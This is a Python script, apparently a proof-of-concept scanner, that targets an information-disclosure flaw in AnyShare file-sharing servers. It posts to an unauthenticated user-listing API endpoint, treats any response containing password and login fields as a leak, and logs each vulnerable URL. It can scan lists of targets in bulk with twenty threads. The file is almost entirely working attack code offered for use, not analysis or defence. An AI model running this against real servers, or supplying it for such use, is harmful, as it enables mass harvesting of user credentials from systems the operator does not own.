import requests
import argparse
import concurrent.futures

def checkVuln(url):
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding':'gzip, deflate',
                'Accept-Language':'zh-CN,zh;q=0.9'
               }
    data = """[1,100]"""
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    try:
        req = requests.post(f"{url}/api/ShareMgnt/Usrm_GetAllUsers",headers=headers,data=data,
                            timeout=5,verify=False)
        if req.status_code == 200 and req.text:
            if "password" in req.text and "loginName" in req.text:
                print(f"\033[1;32m[+] {url}存在信息泄露..." + "\033[0m")
                with open('results.txt','a') as f:
                    f.write(f"{url}/api/ShareMgnt/Usrm_GetAllUsers\n")
                    f.close()
            else:
                print("\033[1;31m[-] {url}未发现信息泄露!" + "\033[0m")
        else:
            print("\033[1;31m[-] {url}未发现信息泄露!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接 {url} 发生了问题!" + "\033[0m")



def banner():
    print("""
    
 $$$$$$\                       $$$$$$\  $$\                                     
$$  __$$\                     $$  __$$\ $$ |                                    
$$ /  $$ |$$$$$$$\  $$\   $$\ $$ /  \__|$$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
$$$$$$$$ |$$  __$$\ $$ |  $$ |\$$$$$$\  $$  __$$\  \____$$\ $$  __$$\ $$  __$$\ 
$$  __$$ |$$ |  $$ |$$ |  $$ | \____$$\ $$ |  $$ | $$$$$$$ |$$ |  \__|$$$$$$$$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$   ____|
$$ |  $$ |$$ |  $$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$\ 
\__|  \__|\__|  \__| \____$$ | \______/ \__|  \__| \_______|\__|       \_______|
                    $$\   $$ |                                                  
                    \$$$$$$  |                                                  
                     \______/                                                   
                                                             By:Bu0uCat
""")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个爱数AnyShare信息泄露脚本")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()
    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")